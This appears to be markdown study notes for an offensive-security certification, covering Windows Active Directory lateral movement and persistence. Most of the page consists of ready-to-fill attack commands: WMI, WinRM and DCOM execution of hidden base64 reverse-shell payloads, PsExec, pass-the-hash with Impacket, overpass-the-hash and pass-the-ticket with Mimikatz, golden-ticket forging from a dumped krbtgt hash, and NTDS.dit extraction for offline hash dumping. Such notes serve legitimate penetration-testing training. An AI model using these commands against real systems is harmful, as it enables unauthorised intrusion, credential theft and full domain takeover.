---
layout: blank
---

Lateral movement doesn't have to be used for different subnets. If we have credentials but lack rdp, lateral movement as a domain user is our friend

### WMI and WinRM

**Windows Management Instrumentation**
- Facilitates task automation via creating processes
- Uses Remote Procedure Calls (RPC) over 135 for remote access
- Abusing `wmic` (recently deprecated, but still probably good) on DMZ
	- `wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create "{process}"`
	- To use with powershell, we need to turn the password into a secure string and pass a reverse shell:
```
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName {target_IP} -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e {reverse_shell_powershell_b64}';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**WinRM**
- Communicates over 5986 and 5985 with XML via HTTP/HTTPS
- Use with `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"` or `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`
- Can also be done via powershell
```
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName {target} -Credential $credential
Enter-PSSession {PSSession_ID_returned}
```

### PsExec
- Tool used to replace telnet-like applications and provide remote execution of processes
- From [PsTools](https://download.sysinternals.com/files/PSTools.zip)
- Requires:
	- Local Administrator
	- `ADMIN$` share available (on by default)
	- File and Printer sharing (on by default)
- `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`

### Pass the Hash (repeat from Module 16)
- Only works for NTLM hashes (discussed in 16 - Password Attacks)
- PsExec, Passing-the-hash toolkit, and Impacket can all pass hashes
- SMB must be open
- Impacket:
	- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` and
	- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`

### Overpass the Hash
- Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
- Assumes we own a server that has a domain user's hash
- This can act as `RunAs` but for a domain user's hash 
- Performed using Mimikatz
	- `sekurlsa::pth /user:{domain_user} /domain:{domain} /ntlm:{compromised_hash} /run:powershell`
- To get a Kerberos ticket, we run something in the new powershell window as jen
	- `net use \\files04`
- Once we have the ticket, we can just use PsExec to run commands on the remote systems using the compromised user
	- `PsExec.exe \\{dnshostname} powershell`
	- This only worked as the _ACTUAL_ `Administrator` local user, not just an administrative user
		- Need to be able to write to C:\Windows
		- We can just change the local Administrator user if we have an administrative user

### Pass the Ticket
- TGTs only work on the machine they're created for, whereas TGSs offer flexibility
- Export current in-memory tickets with `sekurlsa::tickets /export`
	- This exports all tickets in `.kirbi` format in the same file directory, ls to find the ticket names (among other info)
	- We can then pick the desired ticket by passing the ticket name
		- `kerberos::ptt {ticket_name}`
	- If using these to access file shares, running something like `ls \\web04\` will just give an error. Type `ls \\web04\` and press tab (or just `Find-DomainShare` with PowerView)

### DCOM
- Good for lateral movement
- Exploits the Distributed Component Object Model (DCOM)
	- Used for creating software components that interact with each other
	- Local administrator access required
- Lateral movement attacks documented by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
- Performed using built-in CreateInstance
	- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target_IP}"))` 
	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`

### SMB
- `net view //{dnshostname or IP} /all`

### Persistence
- Not exactly tested by the exam, but shells can be flaky and these can help

**Golden Ticket**
- Trying to get the KDC's secret key to create self-made tickets for any service on the system
- Requires full control over the DC or a being part of a Domain Admin group
	- Or, requires krbtgt hash
- Dump `krbtgt` NTLM hash with mimikatz
	- `lsadump::lsa /patch`
- After grabbing the hash, from any domain user:
	- `kerberos::purge` to delete any existing tickets
	- `kerberos::golden /user:{domain_user} /domain:{domain} /sid:{domain_SID} /krbtgt:{krbtgt_NTLM_hash} /ptt`
		- The `domain_SID` can be gathered from whoami /user
- This will essentially give the domain user Domain Admin privileges
	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
		- Can't use the IP of the DC, as that will resort to NTLM
		
**Shadow Copies**
- Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
- As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
- Installed from [here](https://www.microsoft.com/en-us/download/details.aspx?id=23490)
- Run `vshadow.exe -nw -p C:`
- Then copy the Database from the shadow copy to the C: folder
	- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
- Then, save the SYSTEM hive with `reg.exe save hklm\system c:\system.bak`
- We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`